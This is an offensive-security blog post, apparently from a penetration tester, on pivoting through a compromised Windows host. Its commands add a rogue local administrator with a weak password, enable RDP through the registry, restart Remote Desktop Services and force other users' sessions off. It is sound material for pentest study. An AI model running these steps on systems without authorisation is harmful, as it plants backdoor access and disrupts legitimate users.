---
layout: post
title: Windows RDP Pivot
titledate: 10/17/23
tags: ["infosec","offsec","rdp", "privesc", "powershell"]
---

#### Enabling RDP

in many cases i've found it much easier to work with windows lateral movement and internal network enumeration if I have gui access to the system

if we can get a shell on a windows machine that has admin or better yet system perms, it can be much quicker and more reliable to use a rdp connection than a finnicky shell

set up the connection

depending on the windows version i've found that one of these commands will work - so i run them consecutively 

to not ruin any current default creds that may be useable on other machines, we'll add a new user

    net user ghoog password123! /add
    net localgroup administrators ghoog /add
    net localgroup "Remote Desktop Users" ghoog /add

then execute these PS commands

    Get-CimInstance -Namespace "root\cimv2\TerminalServices" -Class win32_terminalservicesetting | select ServerName, AllowTSConnections

    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0

    Restart-Service -Force -DisplayName "Remote Desktop Services"

then after a minute or so the rdp port should be enabled and viewable with nmap or 

if unable to rdp in , seeing ui error max number of sessions reached, we can 

    query session
    logoff 1

with 1 being a user that is logged in, (of course this could ruin session creds but will get us in for now)

or + clipboard option in xfreerdp